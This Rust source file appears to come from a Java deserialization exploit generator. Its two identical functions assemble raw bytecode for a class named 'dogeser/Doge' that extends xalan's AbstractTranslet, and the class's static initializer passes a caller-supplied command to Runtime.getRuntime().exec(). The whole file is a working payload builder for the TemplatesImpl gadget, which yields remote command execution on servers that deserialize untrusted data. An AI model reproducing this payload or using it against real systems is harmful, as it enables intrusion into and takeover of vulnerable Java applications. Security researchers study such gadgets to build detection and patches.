use crate::util::get_rand_bytes;

pub fn get_f_template_impl(cmd: &str) -> Vec<u8> {
    let mut f_template: Vec<u8> = [
        202, 254, 186, 190, 0, 0, 0, 51, 0, 28, 1, 0, 28, 100, 111, 103, 101, 115, 101, 114, 47,
        68, 111, 103, 101,
    ]
    .to_vec();
    let rand_string = get_rand_bytes(16);
    f_template.extend(&rand_string);
    f_template.extend([
        7, 0, 1, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116,
        7, 0, 3, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 25, 68, 111, 103,
        101,
    ]);
    f_template.extend(&rand_string);
    f_template.extend([
        46, 106, 97, 118, 97, 1, 0, 8, 60, 99, 108, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1,
        0, 4, 67, 111, 100, 101, 1, 0, 17, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117,
        110, 116, 105, 109, 101, 7, 0, 10, 1, 0, 10, 103, 101, 116, 82, 117, 110, 116, 105, 109,
        101, 1, 0, 21, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116,
        105, 109, 101, 59, 12, 0, 12, 0, 13, 10, 0, 11, 0, 14, 1,
    ]);
    let cmd_len = cmd.len() as u16;
    f_template.extend(cmd_len.to_be_bytes());
    f_template.extend(cmd.as_bytes());
    f_template.extend([
        8, 0, 16, 1, 0, 4, 101, 120, 101, 99, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110,
        103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103,
        47, 80, 114, 111, 99, 101, 115, 115, 59, 12, 0, 18, 0, 19, 10, 0, 11, 0, 20, 1, 0, 13, 83,
        116, 97, 99, 107, 77, 97, 112, 84, 97, 98, 108, 101, 1, 0, 64, 99, 111, 109, 47, 115, 117,
        110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105,
        110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 114, 117, 110, 116, 105,
        109, 101, 47, 65, 98, 115, 116, 114, 97, 99, 116, 84, 114, 97, 110, 115, 108, 101, 116, 7,
        0, 23, 1, 0, 6, 60, 105, 110, 105, 116, 62, 12, 0, 25, 0, 8, 10, 0, 24, 0, 26, 0, 33, 0, 2,
        0, 24, 0, 0, 0, 0, 0, 2, 0, 8, 0, 7, 0, 8, 0, 1, 0, 9, 0, 0, 0, 36, 0, 3, 0, 2, 0, 0, 0,
        15, 167, 0, 3, 1, 76, 184, 0, 15, 18, 17, 182, 0, 21, 87, 177, 0, 0, 0, 1, 0, 22, 0, 0, 0,
        3, 0, 1, 3, 0, 1, 0, 25, 0, 8, 0, 1, 0, 9, 0, 0, 0, 17, 0, 1, 0, 1, 0, 0, 0, 5, 42, 183, 0,
        27, 177, 0, 0, 0, 0, 0, 1, 0, 5, 0, 0, 0, 2, 0, 6,
    ]);
    f_template
}

pub fn get_k_template_impl(cmd: &str) -> Vec<u8> {
    let mut k_template: Vec<u8> = [
        202, 254, 186, 190, 0, 0, 0, 51, 0, 28, 1, 0, 28, 100, 111, 103, 101, 115, 101, 114, 47,
        68, 111, 103, 101,
    ]
    .to_vec();
    let rand_string = get_rand_bytes(16);
    k_template.extend(&rand_string);
    k_template.extend([
        7, 0, 1, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116,
        7, 0, 3, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 25, 68, 111, 103,
        101,
    ]);
    k_template.extend(&rand_string);
    k_template.extend([
        46, 106, 97, 118, 97, 1, 0, 8, 60, 99, 108, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1,
        0, 4, 67, 111, 100, 101, 1, 0, 17, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117,
        110, 116, 105, 109, 101, 7, 0, 10, 1, 0, 10, 103, 101, 116, 82, 117, 110, 116, 105, 109,
        101, 1, 0, 21, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116,
        105, 109, 101, 59, 12, 0, 12, 0, 13, 10, 0, 11, 0, 14, 1,
    ]);
    let cmd_len = cmd.len() as u16;
    k_template.extend(cmd_len.to_be_bytes());
    k_template.extend(cmd.as_bytes());
    k_template.extend([
        8, 0, 16, 1, 0, 4, 101, 120, 101, 99, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110,
        103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103,
        47, 80, 114, 111, 99, 101, 115, 115, 59, 12, 0, 18, 0, 19, 10, 0, 11, 0, 20, 1, 0, 13, 83,
        116, 97, 99, 107, 77, 97, 112, 84, 97, 98, 108, 101, 1, 0, 64, 99, 111, 109, 47, 115, 117,
        110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105,
        110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 114, 117, 110, 116, 105,
        109, 101, 47, 65, 98, 115, 116, 114, 97, 99, 116, 84, 114, 97, 110, 115, 108, 101, 116, 7,
        0, 23, 1, 0, 6, 60, 105, 110, 105, 116, 62, 12, 0, 25, 0, 8, 10, 0, 24, 0, 26, 0, 33, 0, 2,
        0, 24, 0, 0, 0, 0, 0, 2, 0, 8, 0, 7, 0, 8, 0, 1, 0, 9, 0, 0, 0, 36, 0, 3, 0, 2, 0, 0, 0,
        15, 167, 0, 3, 1, 76, 184, 0, 15, 18, 17, 182, 0, 21, 87, 177, 0, 0, 0, 1, 0, 22, 0, 0, 0,
        3, 0, 1, 3, 0, 1, 0, 25, 0, 8, 0, 1, 0, 9, 0, 0, 0, 17, 0, 1, 0, 1, 0, 0, 0, 5, 42, 183, 0,
        27, 177, 0, 0, 0, 0, 0, 1, 0, 5, 0, 0, 0, 2, 0, 6,
    ]);
    k_template
}
